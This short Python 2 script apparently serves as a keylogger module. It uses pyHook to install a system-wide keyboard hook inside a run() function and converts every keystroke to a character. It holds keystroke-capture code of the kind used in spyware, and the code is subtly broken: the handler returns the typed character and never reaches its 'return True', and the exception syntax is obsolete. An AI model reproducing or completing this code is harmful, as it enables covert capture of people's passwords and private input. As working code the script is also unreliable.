import pyHook, pythoncom, sys
def run(*args):
  try:    
    print("[*] testing")
    def OnKeyboardEvent(event):
        chr(event.Ascii)
        test = chr(event.Ascii)
        return str(test)
        return True

    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()
  except Exception, e:
      return str(e)
   
